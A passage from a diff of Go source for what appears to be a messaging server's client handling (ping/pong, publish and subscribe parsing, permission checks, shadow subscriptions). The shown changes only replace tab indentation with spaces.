call.\n-\t\tcheckInfoChange = !c.flags.isSet(firstPongSent)\n-\t}\n-\tc.mu.Unlock()\n-\n-\tif checkInfoChange {\n-\t\topts := srv.getOpts()\n-\t\tsrv.mu.Lock()\n-\t\tc.mu.Lock()\n-\t\t// Now that we are under both locks, we can flip the flag.\n-\t\t// This prevents sendAsyncInfoToClients() and code here to\n-\t\t// send a double INFO protocol.\n-\t\tc.flags.set(firstPongSent)\n-\t\t// If there was a cluster update since this client was created,\n-\t\t// send an updated INFO protocol now.\n-\t\tif srv.lastCURLsUpdate >= c.start.UnixNano() || c.mpay != int32(opts.MaxPayload) {\n-\t\t\tc.enqueueProto(c.generateClientInfoJSON(srv.copyInfo()))\n-\t\t}\n-\t\tc.mu.Unlock()\n-\t\tsrv.mu.Unlock()\n-\t}\n+        c.mu.Lock()\n+\n+        if c.isClosed() {\n+                c.mu.Unlock()\n+                return\n+        }\n+\n+        c.sendPong()\n+\n+        // Record this to suppress us sending one if this\n+        // is within a given time interval for activity.\n+        c.ping.last = time.Now()\n+\n+        // If not a CLIENT, we are done. Also the CONNECT should\n+        // have been received, but make sure it is so before proceeding\n+        if c.kind != CLIENT || !c.flags.isSet(connectReceived) {\n+                c.mu.Unlock()\n+                return\n+        }\n+\n+        // If we are here, the CONNECT has been received so we know\n+        // if this client supports async INFO or not.\n+        var (\n+                checkInfoChange bool\n+                srv             = c.srv\n+        )\n+        // For older clients, just flip the firstPongSent flag if not already\n+        // set and we are done.\n+        if c.opts.Protocol < ClientProtoInfo || srv == nil {\n+                c.flags.setIfNotSet(firstPongSent)\n+        } else {\n+                // This is a client that supports async INFO protocols.\n+                // If this is the first PING (so firstPongSent is not set yet),\n+                // we will need to check if there was a change in cluster topology\n+                // or we have a different max payload. We will send this first before\n+                // pong since most clients do flush after connect call.\n+                checkInfoChange = !c.flags.isSet(firstPongSent)\n+        }\n+        c.mu.Unlock()\n+\n+        if checkInfoChange {\n+                opts := srv.getOpts()\n+                srv.mu.Lock()\n+                c.mu.Lock()\n+                // Now that we are under both locks, we can flip the flag.\n+                // This prevents sendAsyncInfoToClients() and code here to\n+                // send a double INFO protocol.\n+                c.flags.set(firstPongSent)\n+                // If there was a cluster update since this client was created,\n+                // send an updated INFO protocol now.\n+                if srv.lastCURLsUpdate >= c.start.UnixNano() || c.mpay != int32(opts.MaxPayload) {\n+                        c.enqueueProto(c.generateClientInfoJSON(srv.copyInfo()))\n+                }\n+                c.mu.Unlock()\n+                srv.mu.Unlock()\n+        }\n }\n \n func (c *client) processPong() {\n-\tc.mu.Lock()\n-\tc.ping.out = 0\n-\tc.rtt = computeRTT(c.rttStart)\n-\tsrv := c.srv\n-\treorderGWs := c.kind == GATEWAY && c.gw.outbound\n-\tc.mu.Unlock()\n-\tif reorderGWs {\n-\t\tsrv.gateway.orderOutboundConnections()\n-\t}\n+        c.mu.Lock()\n+        c.ping.out = 0\n+        c.rtt = computeRTT(c.rttStart)\n+        srv := c.srv\n+        reorderGWs := c.kind == GATEWAY && c.gw.outbound\n+        c.mu.Unlock()\n+        if reorderGWs {\n+                srv.gateway.orderOutboundConnections()\n+        }\n }\n \n // Will return the parts from the raw wire msg.\n func (c *client) msgParts(data []byte) (hdr []byte, msg []byte) {\n-\tif c != nil && c.pa.hdr > 0 {\n-\t\treturn data[:c.pa.hdr], data[c.pa.hdr:]\n-\t}\n-\treturn nil, data\n+        if c != nil && c.pa.hdr > 0 {\n+                return data[:c.pa.hdr], data[c.pa.hdr:]\n+        }\n+        return nil, data\n }\n \n // Header pubs take form HPUB <subject> [reply] <hdr_len> <total_len>\\r\\n\n func (c *client) processHeaderPub(arg []byte) error {\n-\tif !c.headers {\n-\t\treturn ErrMsgHeadersNotSupported\n-\t}\n-\n-\t// Unroll splitArgs to avoid runtime/heap issues\n-\ta := [MAX_HPUB_ARGS][]byte{}\n-\targs := a[:0]\n-\tstart := -1\n-\tfor i, b := range arg {\n-\t\tswitch b {\n-\t\tcase ' ', '\\t':\n-\t\t\tif start >= 0 {\n-\t\t\t\targs = append(args, arg[start:i])\n-\t\t\t\tstart = -1\n-\t\t\t}\n-\t\tdefault:\n-\t\t\tif start < 0 {\n-\t\t\t\tstart = i\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif start >= 0 {\n-\t\targs = append(args, arg[start:])\n-\t}\n-\n-\tc.pa.arg = arg\n-\tswitch len(args) {\n-\tcase 3:\n-\t\tc.pa.subject = args[0]\n-\t\tc.pa.reply = nil\n-\t\tc.pa.hdr = parseSize(args[1])\n-\t\tc.pa.size = parseSize(args[2])\n-\t\tc.pa.hdb = args[1]\n-\t\tc.pa.szb = args[2]\n-\tcase 4:\n-\t\tc.pa.subject = args[0]\n-\t\tc.pa.reply = args[1]\n-\t\tc.pa.hdr = parseSize(args[2])\n-\t\tc.pa.size = parseSize(args[3])\n-\t\tc.pa.hdb = args[2]\n-\t\tc.pa.szb = args[3]\n-\tdefault:\n-\t\treturn fmt.Errorf(\"processHeaderPub Parse Error: '%s'\", arg)\n-\t}\n-\tif c.pa.hdr < 0 {\n-\t\treturn fmt.Errorf(\"processHeaderPub Bad or Missing Header Size: '%s'\", arg)\n-\t}\n-\t// If number overruns an int64, parseSize() will have returned a negative value\n-\tif c.pa.size < 0 {\n-\t\treturn fmt.Errorf(\"processHeaderPub Bad or Missing Total Size: '%s'\", arg)\n-\t}\n-\tif c.pa.hdr > c.pa.size {\n-\t\treturn fmt.Errorf(\"processHeaderPub Header Size larger then TotalSize: '%s'\", arg)\n-\t}\n-\tmaxPayload := atomic.LoadInt32(&c.mpay)\n-\t// Use int64() to avoid int32 overrun...\n-\tif maxPayload != jwt.NoLimit && int64(c.pa.size) > int64(maxPayload) {\n-\t\tc.maxPayloadViolation(c.pa.size, maxPayload)\n-\t\treturn ErrMaxPayload\n-\t}\n-\tif c.opts.Pedantic && !IsValidLiteralSubject(string(c.pa.subject)) {\n-\t\tc.sendErr(\"Invalid Publish Subject\")\n-\t}\n-\treturn nil\n+        if !c.headers {\n+                return ErrMsgHeadersNotSupported\n+        }\n+\n+        // Unroll splitArgs to avoid runtime/heap issues\n+        a := [MAX_HPUB_ARGS][]byte{}\n+        args := a[:0]\n+        start := -1\n+        for i, b := range arg {\n+                switch b {\n+                case ' ', '\\t':\n+                        if start >= 0 {\n+                                args = append(args, arg[start:i])\n+                                start = -1\n+                        }\n+                default:\n+                        if start < 0 {\n+                                start = i\n+                        }\n+                }\n+        }\n+        if start >= 0 {\n+                args = append(args, arg[start:])\n+        }\n+\n+        c.pa.arg = arg\n+        switch len(args) {\n+        case 3:\n+                c.pa.subject = args[0]\n+                c.pa.reply = nil\n+                c.pa.hdr = parseSize(args[1])\n+                c.pa.size = parseSize(args[2])\n+                c.pa.hdb = args[1]\n+                c.pa.szb = args[2]\n+        case 4:\n+                c.pa.subject = args[0]\n+                c.pa.reply = args[1]\n+                c.pa.hdr = parseSize(args[2])\n+                c.pa.size = parseSize(args[3])\n+                c.pa.hdb = args[2]\n+                c.pa.szb = args[3]\n+        default:\n+                return fmt.Errorf(\"processHeaderPub Parse Error: '%s'\", arg)\n+        }\n+        if c.pa.hdr < 0 {\n+                return fmt.Errorf(\"processHeaderPub Bad or Missing Header Size: '%s'\", arg)\n+        }\n+        // If number overruns an int64, parseSize() will have returned a negative value\n+        if c.pa.size < 0 {\n+                return fmt.Errorf(\"processHeaderPub Bad or Missing Total Size: '%s'\", arg)\n+        }\n+        if c.pa.hdr > c.pa.size {\n+                return fmt.Errorf(\"processHeaderPub Header Size larger then TotalSize: '%s'\", arg)\n+        }\n+        maxPayload := atomic.LoadInt32(&c.mpay)\n+        // Use int64() to avoid int32 overrun...\n+        if maxPayload != jwt.NoLimit && int64(c.pa.size) > int64(maxPayload) {\n+                c.maxPayloadViolation(c.pa.size, maxPayload)\n+                return ErrMaxPayload\n+        }\n+        if c.opts.Pedantic && !IsValidLiteralSubject(string(c.pa.subject)) {\n+                c.sendErr(\"Invalid Publish Subject\")\n+        }\n+        return nil\n }\n \n func (c *client) processPub(arg []byte) error {\n-\t// Unroll splitArgs to avoid runtime/heap issues\n-\ta := [MAX_PUB_ARGS][]byte{}\n-\targs := a[:0]\n-\tstart := -1\n-\tfor i, b := range arg {\n-\t\tswitch b {\n-\t\tcase ' ', '\\t':\n-\t\t\tif start >= 0 {\n-\t\t\t\targs = append(args, arg[start:i])\n-\t\t\t\tstart = -1\n-\t\t\t}\n-\t\tdefault:\n-\t\t\tif start < 0 {\n-\t\t\t\tstart = i\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif start >= 0 {\n-\t\targs = append(args, arg[start:])\n-\t}\n-\n-\tc.pa.arg = arg\n-\tswitch len(args) {\n-\tcase 2:\n-\t\tc.pa.subject = args[0]\n-\t\tc.pa.reply = nil\n-\t\tc.pa.size = parseSize(args[1])\n-\t\tc.pa.szb = args[1]\n-\tcase 3:\n-\t\tc.pa.subject = args[0]\n-\t\tc.pa.reply = args[1]\n-\t\tc.pa.size = parseSize(args[2])\n-\t\tc.pa.szb = args[2]\n-\tdefault:\n-\t\treturn fmt.Errorf(\"processPub Parse Error: '%s'\", arg)\n-\t}\n-\t// If number overruns an int64, parseSize() will have returned a negative value\n-\tif c.pa.size < 0 {\n-\t\treturn fmt.Errorf(\"processPub Bad or Missing Size: '%s'\", arg)\n-\t}\n-\tmaxPayload := atomic.LoadInt32(&c.mpay)\n-\t// Use int64() to avoid int32 overrun...\n-\tif maxPayload != jwt.NoLimit && int64(c.pa.size) > int64(maxPayload) {\n-\t\tc.maxPayloadViolation(c.pa.size, maxPayload)\n-\t\treturn ErrMaxPayload\n-\t}\n-\tif c.opts.Pedantic && !IsValidLiteralSubject(string(c.pa.subject)) {\n-\t\tc.sendErr(\"Invalid Publish Subject\")\n-\t}\n-\treturn nil\n+        // Unroll splitArgs to avoid runtime/heap issues\n+        a := [MAX_PUB_ARGS][]byte{}\n+        args := a[:0]\n+        start := -1\n+        for i, b := range arg {\n+                switch b {\n+                case ' ', '\\t':\n+                        if start >= 0 {\n+                                args = append(args, arg[start:i])\n+                                start = -1\n+                        }\n+                default:\n+                        if start < 0 {\n+                                start = i\n+                        }\n+                }\n+        }\n+        if start >= 0 {\n+                args = append(args, arg[start:])\n+        }\n+\n+        c.pa.arg = arg\n+        switch len(args) {\n+        case 2:\n+                c.pa.subject = args[0]\n+                c.pa.reply = nil\n+                c.pa.size = parseSize(args[1])\n+                c.pa.szb = args[1]\n+        case 3:\n+                c.pa.subject = args[0]\n+                c.pa.reply = args[1]\n+                c.pa.size = parseSize(args[2])\n+                c.pa.szb = args[2]\n+        default:\n+                return fmt.Errorf(\"processPub Parse Error: '%s'\", arg)\n+        }\n+        // If number overruns an int64, parseSize() will have returned a negative value\n+        if c.pa.size < 0 {\n+                return fmt.Errorf(\"processPub Bad or Missing Size: '%s'\", arg)\n+        }\n+        maxPayload := atomic.LoadInt32(&c.mpay)\n+        // Use int64() to avoid int32 overrun...\n+        if maxPayload != jwt.NoLimit && int64(c.pa.size) > int64(maxPayload) {\n+                c.maxPayloadViolation(c.pa.size, maxPayload)\n+                return ErrMaxPayload\n+        }\n+        if c.opts.Pedantic && !IsValidLiteralSubject(string(c.pa.subject)) {\n+                c.sendErr(\"Invalid Publish Subject\")\n+        }\n+        return nil\n }\n \n func splitArg(arg []byte) [][]byte {\n-\ta := [MAX_MSG_ARGS][]byte{}\n-\targs := a[:0]\n-\tstart := -1\n-\tfor i, b := range arg {\n-\t\tswitch b {\n-\t\tcase ' ', '\\t', '\\r', '\\n':\n-\t\t\tif start >= 0 {\n-\t\t\t\targs = append(args, arg[start:i])\n-\t\t\t\tstart = -1\n-\t\t\t}\n-\t\tdefault:\n-\t\t\tif start < 0 {\n-\t\t\t\tstart = i\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif start >= 0 {\n-\t\targs = append(args, arg[start:])\n-\t}\n-\treturn args\n+        a := [MAX_MSG_ARGS][]byte{}\n+        args := a[:0]\n+        start := -1\n+        for i, b := range arg {\n+                switch b {\n+                case ' ', '\\t', '\\r', '\\n':\n+                        if start >= 0 {\n+                                args = append(args, arg[start:i])\n+                                start = -1\n+                        }\n+                default:\n+                        if start < 0 {\n+                                start = i\n+                        }\n+                }\n+        }\n+        if start >= 0 {\n+                args = append(args, arg[start:])\n+        }\n+        return args\n }\n \n func (c *client) parseSub(argo []byte, noForward bool) error {\n-\t// Copy so we do not reference a potentially large buffer\n-\t// FIXME(dlc) - make more efficient.\n-\targ := make([]byte, len(argo))\n-\tcopy(arg, argo)\n-\targs := splitArg(arg)\n-\tvar (\n-\t\tsubject []byte\n-\t\tqueue   []byte\n-\t\tsid     []byte\n-\t)\n-\tswitch len(args) {\n-\tcase 2:\n-\t\tsubject = args[0]\n-\t\tqueue = nil\n-\t\tsid = args[1]\n-\tcase 3:\n-\t\tsubject = args[0]\n-\t\tqueue = args[1]\n-\t\tsid = args[2]\n-\tdefault:\n-\t\treturn fmt.Errorf(\"processSub Parse Error: '%s'\", arg)\n-\t}\n-\t// If there was an error, it has been sent to the client. We don't return an\n-\t// error here to not close the connection as a parsing error.\n-\tc.processSub(subject, queue, sid, nil, noForward)\n-\treturn nil\n+        // Copy so we do not reference a potentially large buffer\n+        // FIXME(dlc) - make more efficient.\n+        arg := make([]byte, len(argo))\n+        copy(arg, argo)\n+        args := splitArg(arg)\n+        var (\n+                subject []byte\n+                queue   []byte\n+                sid     []byte\n+        )\n+        switch len(args) {\n+        case 2:\n+                subject = args[0]\n+                queue = nil\n+                sid = args[1]\n+        case 3:\n+                subject = args[0]\n+                queue = args[1]\n+                sid = args[2]\n+        default:\n+                return fmt.Errorf(\"processSub Parse Error: '%s'\", arg)\n+        }\n+        // If there was an error, it has been sent to the client. We don't return an\n+        // error here to not close the connection as a parsing error.\n+        c.processSub(subject, queue, sid, nil, noForward)\n+        return nil\n }\n \n func (c *client) processSub(subject, queue, bsid []byte, cb msgHandler, noForward bool) (*subscription, error) {\n-\treturn c.processSubEx(subject, queue, bsid, cb, noForward, false, false)\n+        return c.processSubEx(subject, queue, bsid, cb, noForward, false, false)\n }\n \n func (c *client) processSubEx(subject, queue, bsid []byte, cb msgHandler, noForward, si, rsi bool) (*subscription, error) {\n-\t// Create the subscription\n-\tsub := &subscription{client: c, subject: subject, queue: queue, sid: bsid, icb: cb, si: si, rsi: rsi}\n-\n-\tc.mu.Lock()\n-\n-\t// Indicate activity.\n-\tc.in.subs++\n-\n-\t// Grab connection type, account and server info.\n-\tkind := c.kind\n-\tacc := c.acc\n-\tsrv := c.srv\n-\n-\tsid := string(sub.sid)\n-\n-\t// This check does not apply to SYSTEM or JETSTREAM or ACCOUNT clients (because they don't have a `nc`...)\n-\tif c.isClosed() && (kind != SYSTEM && kind != JETSTREAM && kind != ACCOUNT) {\n-\t\tc.mu.Unlock()\n-\t\treturn nil, ErrConnectionClosed\n-\t}\n-\n-\t// Check permissions if applicable.\n-\tif kind == CLIENT {\n-\t\t// First do a pass whether queue subscription is valid. This does not necessarily\n-\t\t// mean that it will not be able to plain subscribe.\n-\t\t//\n-\t\t// allow = [\"foo\"]            -> can subscribe or queue subscribe to foo using any queue\n-\t\t// allow = [\"foo v1\"]         -> can only queue subscribe to 'foo v1', no plain subs allowed.\n-\t\t// allow = [\"foo\", \"foo v1\"]  -> can subscribe to 'foo' but can only queue subscribe to 'foo v1'\n-\t\t//\n-\t\tif sub.queue != nil {\n-\t\t\tif !c.canQueueSubscribe(string(sub.subject), string(sub.queue)) {\n-\t\t\t\tc.mu.Unlock()\n-\t\t\t\tc.subPermissionViolation(sub)\n-\t\t\t\treturn nil, ErrSubscribePermissionViolation\n-\t\t\t}\n-\t\t} else if !c.canSubscribe(string(sub.subject)) {\n-\t\t\tc.mu.Unlock()\n-\t\t\tc.subPermissionViolation(sub)\n-\t\t\treturn nil, ErrSubscribePermissionViolation\n-\t\t}\n-\n-\t\tif opts := srv.getOpts(); opts != nil && opts.MaxSubTokens > 0 {\n-\t\t\tif len(bytes.Split(sub.subject, []byte(tsep))) > int(opts.MaxSubTokens) {\n-\t\t\t\tc.mu.Unlock()\n-\t\t\t\tc.maxTokensViolation(sub)\n-\t\t\t\treturn nil, ErrTooManySubTokens\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Check if we have a maximum on the number of subscriptions.\n-\tif c.subsAtLimit() {\n-\t\tc.mu.Unlock()\n-\t\tc.maxSubsExceeded()\n-\t\treturn nil, ErrTooManySubs\n-\t}\n-\n-\tvar updateGWs bool\n-\tvar err error\n-\n-\t// Subscribe here.\n-\tes := c.subs[sid]\n-\tif es == nil {\n-\t\tc.subs[sid] = sub\n-\t\tif acc != nil && acc.sl != nil {\n-\t\t\terr = acc.sl.Insert(sub)\n-\t\t\tif err != nil {\n-\t\t\t\tdelete(c.subs, sid)\n-\t\t\t} else {\n-\t\t\t\tupdateGWs = c.srv.gateway.enabled\n-\t\t\t}\n-\t\t}\n-\t}\n-\t// Unlocked from here onward\n-\tc.mu.Unlock()\n-\n-\tif err != nil {\n-\t\tc.sendErr(\"Invalid Subject\")\n-\t\treturn nil, ErrMalformedSubject\n-\t} else if c.opts.Verbose && kind != SYSTEM {\n-\t\tc.sendOK()\n-\t}\n-\n-\t// If it was already registered, return it.\n-\tif es != nil {\n-\t\treturn es, nil\n-\t}\n-\n-\t// No account just return.\n-\tif acc == nil {\n-\t\treturn sub, nil\n-\t}\n-\n-\tif err := c.addShadowSubscriptions(acc, sub); err != nil {\n-\t\tc.Errorf(err.Error())\n-\t}\n-\n-\tif noForward {\n-\t\treturn sub, nil\n-\t}\n-\n-\t// If we are routing and this is a local sub, add to the route map for the associated account.\n-\tif kind == CLIENT || kind == SYSTEM || kind == JETSTREAM || kind == ACCOUNT {\n-\t\tsrv.updateRouteSubscriptionMap(acc, sub, 1)\n-\t\tif updateGWs {\n-\t\t\tsrv.gatewayUpdateSubInterest(acc.Name, sub, 1)\n-\t\t}\n-\t}\n-\t// Now check on leafnode updates.\n-\tsrv.updateLeafNodes(acc, sub, 1)\n-\treturn sub, nil\n+        // Create the subscription\n+        sub := &subscription{client: c, subject: subject, queue: queue, sid: bsid, icb: cb, si: si, rsi: rsi}\n+\n+        c.mu.Lock()\n+\n+        // Indicate activity.\n+        c.in.subs++\n+\n+        // Grab connection type, account and server info.\n+        kind := c.kind\n+        acc := c.acc\n+        srv := c.srv\n+\n+        sid := string(sub.sid)\n+\n+        // This check does not apply to SYSTEM or JETSTREAM or ACCOUNT clients (because they don't have a `nc`...)\n+        if c.isClosed() && (kind != SYSTEM && kind != JETSTREAM && kind != ACCOUNT) {\n+                c.mu.Unlock()\n+                return nil, ErrConnectionClosed\n+        }\n+\n+        // Check permissions if applicable.\n+        if kind == CLIENT {\n+                // First do a pass whether queue subscription is valid. This does not necessarily\n+                // mean that it will not be able to plain subscribe.\n+                //\n+                // allow = [\"foo\"]            -> can subscribe or queue subscribe to foo using any queue\n+                // allow = [\"foo v1\"]         -> can only queue subscribe to 'foo v1', no plain subs allowed.\n+                // allow = [\"foo\", \"foo v1\"]  -> can subscribe to 'foo' but can only queue subscribe to 'foo v1'\n+                //\n+                if sub.queue != nil {\n+                        if !c.canQueueSubscribe(string(sub.subject), string(sub.queue)) {\n+                                c.mu.Unlock()\n+                                c.subPermissionViolation(sub)\n+                                return nil, ErrSubscribePermissionViolation\n+                        }\n+                } else if !c.canSubscribe(string(sub.subject)) {\n+                        c.mu.Unlock()\n+                        c.subPermissionViolation(sub)\n+                        return nil, ErrSubscribePermissionViolation\n+                }\n+\n+                if opts := srv.getOpts(); opts != nil && opts.MaxSubTokens > 0 {\n+                        if len(bytes.Split(sub.subject, []byte(tsep))) > int(opts.MaxSubTokens) {\n+                                c.mu.Unlock()\n+                                c.maxTokensViolation(sub)\n+                                return nil, ErrTooManySubTokens\n+                        }\n+                }\n+        }\n+\n+        // Check if we have a maximum on the number of subscriptions.\n+        if c.subsAtLimit() {\n+                c.mu.Unlock()\n+                c.maxSubsExceeded()\n+                return nil, ErrTooManySubs\n+        }\n+\n+        var updateGWs bool\n+        var err error\n+\n+        // Subscribe here.\n+        es := c.subs[sid]\n+        if es == nil {\n+                c.subs[sid] = sub\n+                if acc != nil && acc.sl != nil {\n+                        err = acc.sl.Insert(sub)\n+                        if err != nil {\n+                                delete(c.subs, sid)\n+                        } else {\n+                                updateGWs = c.srv.gateway.enabled\n+                        }\n+                }\n+        }\n+        // Unlocked from here onward\n+        c.mu.Unlock()\n+\n+        if err != nil {\n+                c.sendErr(\"Invalid Subject\")\n+                return nil, ErrMalformedSubject\n+        } else if c.opts.Verbose && kind != SYSTEM {\n+                c.sendOK()\n+        }\n+\n+        // If it was already registered, return it.\n+        if es != nil {\n+                return es, nil\n+        }\n+\n+        // No account just return.\n+        if acc == nil {\n+                return sub, nil\n+        }\n+\n+        if err := c.addShadowSubscriptions(acc, sub); err != nil {\n+                c.Errorf(err.Error())\n+        }\n+\n+        if noForward {\n+                return sub, nil\n+        }\n+\n+        // If we are routing and this is a local sub, add to the route map for the associated account.\n+        if kind == CLIENT || kind == SYSTEM || kind == JETSTREAM || kind == ACCOUNT {\n+                srv.updateRouteSubscriptionMap(acc, sub, 1)\n+                if updateGWs {\n+                        srv.gatewayUpdateSubInterest(acc.Name, sub, 1)\n+                }\n+        }\n+        // Now check on leafnode updates.\n+        srv.updateLeafNodes(acc, sub, 1)\n+        return sub, nil\n }\n \n // Used to pass stream import matches to addShadowSub\n type ime struct {\n-\tim          *streamImport\n-\toverlapSubj string\n-\tdyn         bool\n+        im          *streamImport\n+        overlapSubj string\n+        dyn         bool\n }\n \n // If the client's account has stream imports and there are matches for\n // this subscription's subject, then add shadow subscriptions in the\n // other accounts that export this subject.\n func (c *client) addShadowSubscriptions(acc *Account, sub *subscription) error {\n-\tif acc == nil {\n-\t\treturn ErrMissingAccount\n-\t}\n-\n-\tvar (\n-\t\t_ims           [16]ime\n-\t\tims            = _ims[:0]\n-\t\timTsa          [32]string\n-\t\ttokens         []string\n-\t\ttsa            [32]string\n-\t\thasWC          bool\n-\t\ttokensModified bool\n-\t)\n-\n-\tacc.mu.RLock()\n-\tsubj := string(sub.subject)\n-\tif len(acc.imports.streams) > 0 {\n-\t\ttokens = tokenizeSubjectIntoSlice(tsa[:0], subj)\n-\t\tfor _, tk := range tokens {\n-\t\t\tif tk == pwcs {\n-\t\t\t\thasWC = true\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t\tif !hasWC && tokens[len(tokens)-1] == fwcs {\n-\t\t\thasWC = true\n-\t\t}\n-\t}\n-\t// Loop over the import subjects. We have 4 scenarios. If we have an\n-\t// exact match or a superset match we should use the from field from\n-\t// the import. If we are a subset or overlap, we have to dynamically calculate\n-\t// the subject. On overlap, ime requires the overlap subject.\n-\tfor _, im := range acc.imports.streams {\n-\t\tif im.invalid {\n-\t\t\tcontinue\n-\t\t}\n-\t\tif subj == im.to {\n-\t\t\tims = append(ims, ime{im, _EMPTY_, false})\n-\t\t\tcontinue\n-\t\t}\n-\t\tif tokensModified {\n-\t\t\t// re-tokenize subj to overwrite modifications from a previous iteration\n-\t\t\ttokens = tokenizeSubjectIntoSlice(tsa[:0], subj)\n-\t\t\ttokensModified = false\n-\t\t}\n-\t\timTokens := tokenizeSubjectIntoSlice(imTsa[:0], im.to)\n-\n-\t\tif isSubsetMatchTokenized(tokens, imTokens) {\n-\t\t\tims = append(ims, ime{im, _EMPTY_, true})\n-\t\t} else if hasWC {\n-\t\t\tif isSubsetMatchTokenized(imTokens, tokens) {\n-\t\t\t\tims = append(ims, ime{im, _EMPTY_, false})\n-\t\t\t} else {\n-\t\t\t\timTokensLen := len(imTokens)\n-\t\t\t\tfor i, t := range tokens {\n-\t\t\t\t\tif i >= imTokensLen {\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t\tif t == pwcs && imTokens[i] != fwcs {\n-\t\t\t\t\t\ttokens[i] = imTokens[i]\n-\t\t\t\t\t\ttokensModified = true\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\ttokensLen := len(tokens)\n-\t\t\t\tlastIdx := tokensLen - 1\n-\t\t\t\tif tokens[lastIdx] == fwcs {\n-\t\t\t\t\tif imTokensLen >= tokensLen {\n-\t\t\t\t\t\t// rewrite \">\" in tokens to be more specific\n-\t\t\t\t\t\ttokens[lastIdx] = imTokens[lastIdx]\n-\t\t\t\t\t\ttokensModified = true\n-\t\t\t\t\t\tif imTokensLen > tokensLen {\n-\t\t\t\t\t\t\t// copy even more specific parts from import\n-\t\t\t\t\t\t\ttokens = append(tokens, imTokens[tokensLen:]...)\n-\t\t\t\t\t\t}\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tif isSubsetMatchTokenized(tokens, imTokens) {\n-\t\t\t\t\t// As isSubsetMatchTokenized was already called with tokens and imTokens,\n-\t\t\t\t\t// we wouldn't be here if it where not for tokens being modified.\n-\t\t\t\t\t// Hence, Join to re compute the subject string\n-\t\t\t\t\tims = append(ims, ime{im, strings.Join(tokens, tsep), true})\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\tacc.mu.RUnlock()\n-\n-\tvar shadow []*subscription\n-\n-\tif len(ims) > 0 {\n-\t\tshadow = make([]*subscription, 0, len(ims))\n-\t}\n-\n-\t// Now walk through collected stream imports that matched.\n-\tfor i := 0; i < len(ims); i++ {\n-\t\time := &ims[i]\n-\t\t// We will create a shadow subscription.\n-\t\tnsub, err := c.addShadowSub(sub, ime)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tshadow = append(shadow, nsub)\n-\t}\n-\n-\tif shadow != nil {\n-\t\tc.mu.Lock()\n-\t\tsub.shadow = shadow\n-\t\tc.mu.Unlock()\n-\t}\n-\n-\treturn nil\n+        if acc == nil {\n+                return ErrMissingAccount\n+        }\n+\n+        var (\n+                _ims           [16]ime\n+                ims            = _ims[:0]\n+                imTsa          [32]string\n+                tokens         []string\n+                tsa            [32]string\n+                hasWC          bool\n+                tokensModified bool\n+        )\n+\n+        acc.mu.RLock()\n+        subj := string(sub.subject)\n+        if len(acc.imports.streams) > 0 {\n+                tokens = tokenizeSubjectIntoSlice(tsa[:0], subj)\n+                for _, tk := range tokens {\n+                        if tk == pwcs {\n+                                hasWC = true\n+                                break\n+                        }\n+                }\n+                if !hasWC && tokens[len(tokens)-1] == fwcs {\n+                        hasWC = true\n+                }\n+        }\n+        // Loop over the import subjects. We have 4 scenarios. If we have an\n+        // exact match or a superset match we should use the from field from\n+        // the import. If we are a subset or overlap, we have to dynamically calculate\n+        // the subject. On overlap, ime requires the overlap subject.\n+        for _, im := range acc.imports.streams {\n+                if im.invalid {\n+                        continue\n+                }\n+                if subj == im.to {\n+                        ims = append(ims, ime{im, _EMPTY_, false})\n+                        continue\n+                }\n+                if tokensModified {\n+                        // re-tokenize subj to overwrite modifications from a previous iteration\n+                        tokens = tokenizeSubjectIntoSlice(tsa[:0], subj)\n+                        tokensModified = false\n+                }\n+                imTokens := tokenizeSubjectIntoSlice(imTsa[:0], im.to)\n+\n+                if isSubsetMatchTokenized(tokens, imTokens) {\n+                        ims = append(ims, ime{im, _EMPTY_, true})\n+                } else if hasWC {\n+                        if isSubsetMatchTokenized(imTokens, tokens) {\n+                                ims = append(ims, ime{im, _EMPTY_, false})\n+                        } else {\n+                                imTokensLen := len(imTokens)\n+                                for i, t := range tokens {\n+                                        if i >= imTokensLen {\n+                                                break\n+                                        }\n+                                        if t == pwcs && imTokens[i] != fwcs {\n+                                                tokens[i] = imTokens[i]\n+                                                tokensModified = true\n+                                        }\n+                                }\n+                                tokensLen := len(tokens)\n+                                lastIdx := tokensLen - 1\n+                                if tokens[lastIdx] == fwcs {\n+                                        if imTokensLen >= tokensLen {\n+                                                // rewrite \">\" in tokens to be more specific\n+                                                tokens[lastIdx] = imTokens[lastIdx]\n+                                                tokensModified = true\n+                                                if imTokensLen > tokensLen {\n+                                                        // copy even more specific parts from import\n+                                                        tokens = append(tokens, imTokens[tokensLen:]...)\n+                                                }\n+                                        }\n+                                }\n+                                if isSubsetMatchTokenized(tokens, imTokens) {\n+                                        // As isSubsetMatchTokenized was already called with tokens and imTokens,\n+                                        // we wouldn't be here if it where not for tokens being modified.\n+                                        // Hence, Join to re compute the subject string\n+                                        ims = append(ims, ime{im, strings.Join(tokens, tsep), true})\n+                                }\n+                        }\n+                }\n+        }\n+        acc.mu.RUnlock()\n+\n+        var shadow []*subscription\n+\n+        if len(ims) > 0 {\n+                shadow = make([]*subscription, 0, len(ims))\n+        }\n+\n+        // Now walk through collected stream imports that matched.\n+        for i := 0; i < len(ims); i++ {\n+                ime := &ims[i]\n+                // We will create a shadow subscription.\n+                nsub, err := c.addShadowSub(sub, ime)\n+                if err != nil {\n+                        return err\n+                }\n+                shadow = append(shadow, nsub)\n+        }\n+\n+        if shadow != nil {\n+                c.mu.Lock()\n+                sub.shadow = shadow\n+                c.mu.Unlock()\n+        }\n+\n+        return nil\n }\n \n // Add in the shadow subscription.\n func (c *client) addShadowSub(sub *subscription, ime *ime) (*subscription, error) {\n-\tim := ime.im\n-\tnsub := *sub // copy\n-\tnsub.im = im\n-\n-\tif !im.usePub && ime.dyn {\n-\t\tif im.rtr == nil {\n-\t\t\tim.rtr = im.tr.reverse()\n-\t\t}\n-\t\ts := string(nsub.subject)\n-\t\tif ime.overlapSubj != _EMPTY_ {\n-\t\t\ts = ime.overlapSubj\n-\t\t}\n-\t\tsubj, err := im.rtr.transformSubject(s)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tnsub.subject = []byte(subj)\n-\t} else if !im.usePub || 